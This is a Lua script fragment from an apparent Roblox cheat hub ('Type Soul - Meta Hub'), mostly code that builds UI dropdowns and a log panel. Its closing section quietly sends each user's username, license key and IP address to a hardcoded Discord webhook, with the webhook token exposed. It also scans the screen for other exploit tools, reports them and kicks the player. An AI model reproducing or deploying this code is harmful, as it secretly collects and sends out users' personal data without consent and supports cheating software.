				OptionName.Size = UDim2.new(0.975000024, 0, 1, 0)
				OptionName.Font = Enum.Font.SourceSansBold
				OptionName.Text = #items > 0 and table.concat(items, ", ") or "Select"
				OptionName.TextColor3 = Color3.fromRGB(180, 163, 185)
				OptionName.TextSize = 16.000
				OptionName.TextXAlignment = Enum.TextXAlignment.Left


				UIListLayout_2.Parent = Holder_2
				UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout_2.Padding = UDim.new(0, 0)



				OptionName.MouseButton1Click:Connect(function()
					local c = 0
					for i,v in pairs(Holder_2:GetChildren()) do
						if v:IsA("Frame") then
							c +=1
						end
					end
					Holder_2.Size = UDim2.new(1,0,0,72)
					Holder_2.CanvasSize = UDim2.new(1,0,0,(c * 24))
					Holder_2.Visible = not Holder_2.Visible
				end)

				function multidropdown:Add(id)
					local OptionHolder = Instance.new("Frame")
					local Option = Instance.new("TextButton")
					OptionHolder.Name = id
					OptionHolder.Parent = Holder_2
					OptionHolder.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
					OptionHolder.BorderColor3 = Color3.fromRGB(180, 163, 185)
					OptionHolder.Size = UDim2.new(1, 0, 0, 24)
					OptionHolder.ZIndex = 10

					Option.Name = "Option"
					Option.Parent = OptionHolder
					Option.BackgroundColor3 = Color3.fromRGB(54, 48, 61)
					Option.BackgroundTransparency = 1.000
					Option.BorderColor3 = Color3.fromRGB(180, 163, 185)
					Option.Position = UDim2.new(0.0250000004, 0, 0, 0)
					Option.Size = UDim2.new(0.975000024, 0, 0, 23)
					Option.Font = Enum.Font.SourceSansBold
					Option.TextColor3 = Color3.fromRGB(180, 163, 185)
					Option.TextSize = 16.000
					Option.TextXAlignment = Enum.TextXAlignment.Left
					Option.Text = id

					Option.MouseButton1Click:Connect(function()
						if not table.find(items, id) then
							table.insert(items, id)
							Option.TextColor3 = Color3.fromRGB(180, 163, 185)
							OptionName.Text = table.concat(items, ", ")
							callback(items)
						else
							table.remove(items, table.find(items, id))
							Option.TextColor3 = Color3.fromRGB(180, 163, 185)
							OptionName.Text = #items > 0 and table.concat(items, ", ") or "Select"
							callback(items)

						end

						Holder_2.Visible = false
					end)


				end

				return multidropdown
			end
			return content
		end
		return insideTab
	end
	return inLib
end


local function log(text)
	print(text)
	local meta = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Meta")
	local frame = meta.Logs:FindFirstChild("ScrollingFrame")
	if meta and text then
		print('found')
		local log = Instance.new("Frame")
		local TextLabel = Instance.new("TextLabel")

		log.Name = "log"
		log.Parent = frame
		log.BackgroundColor3 = Color3.fromRGB(63, 49, 62)
		log.BackgroundTransparency = 0.700
		log.BorderColor3 = Color3.fromRGB(0, 0, 0)
		log.BorderSizePixel = 0
		log.Position = UDim2.new(0, 0, 0.147754133, 0)
		log.Size = UDim2.new(1, 0, 0.02, 0)

		TextLabel.Parent = log
		TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.BackgroundTransparency = 1.000
		TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TextLabel.BorderSizePixel = 0
		TextLabel.Position = UDim2.new(0.00999999978, 0, 0, 0)
		TextLabel.Size = UDim2.new(0.99000001, 0, 1, 0)
		TextLabel.Font = Enum.Font.SourceSansBold
		TextLabel.Text = text
		TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextLabel.TextSize = 14.000
		TextLabel.TextWrapped = true
		TextLabel.TextXAlignment = Enum.TextXAlignment.Left
	end
end

function webhook(v,v2,v3)
	print(v,v2,v3)
	httpservice = game:GetService("HttpService")
	local response =
		request(
			{
				Url = "https://discord.com/api/webhooks/1241393145866878996/KBXb8wpgO78mz3TvU_bh5LO32gJuMzKXC1Xjlms-pbLPglurtDtgWKod8SIXdfWTb8Zm",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = httpservice:JSONEncode(
					{
						["content"] = "",
						["embeds"] = {
							{
								["title"] = "Data",
								["description"] = "Tried executing, "..v..','..v2..','..v3.."\n**User:** "..game.Players.LocalPlayer.Name.."\n **Key:** "..getgenv().key.."\n **IP: **"..ip,
								["type"] = "rich",
								["color"] = tonumber(0xd9abd7),
								["footer"] = {
									["text"] = "Type Soul - Meta Hub",
									["icon_url"] = "https://cdn.discordapp.com/attachments/677945935686270995/1242969432486187128/meta_logo_only_2.png?ex=664fc4fd&is=664e737d&hm=0282df1fbff330d42729f143d44bce426c2b949059327e7580f210f22c0c8965&"
								}
							}
						}
					}
				)
			}
		)
end
local deb =	true
local feb = true
game.CoreGui.ChildAdded:Connect(function(v)
	if v:IsA("ScreenGui") then
		for i2,v2 in pairs(v:GetDescendants()) do
			if v2:IsA("TextLabel") or v2:IsA('TextButton') then
				if string.find(v.Name, "Delta") or string.find(v.Name, "Fluxus") then webhook(v.Name,v2.Parent.Name,v2.Text) return Library end
				if feb == true  or string.find(v2.Text, 'Dex') or string.find(v2.Text, 'spy') or string.find(v2.Text, 'DEX') or string.find(v2.Text, 'Spy') or string.find(v2.Text, 'Explorer') or string.find(v2.Text, 'Hub') or string.find(v2.Text, 'Remotes') then
					feb=false
					webhook(v.Name,v2.Parent.Name,v2.Text)
					game:GetService('Players').LocalPlayer:Kick('Do not execute anything with this script, doing so will lead into getting blacklisted.')

				end
			end
		end
	end
end)

for i,v in pairs(game.CoreGui:GetChildren()) do
	if v:IsA("ScreenGui") then
		for i2,v2 in pairs(v:GetDescendants()) do
			if v2:IsA("TextLabel") or v2:IsA('TextButton') then
				if string.find(v.Name, "Delta") or string.find(v.Name, "Fluxus") then webhook(v.Name,v2.Parent.Name,v2.Text) return Library end
				if deb and string.find(v2.Text, 'Dex') or string.find(v2.Text, 'spy') or string.find(v2.Text, 'DEX') or string.find(v2.Text, 'Spy') or string.find(v2.Text, 'Explorer') or string.find(v2.Text, 'Hub') or string.find(v2.Text, 'Remotes') then
					deb =false
					webhook(v.Name,v2.Parent.Name,v2.Text)
					game:GetService('Players').LocalPlayer:Kick('Do not execute anything with this script, doing so will lead into getting blacklisted.')

				end
			end
		end
	end
end

return Library

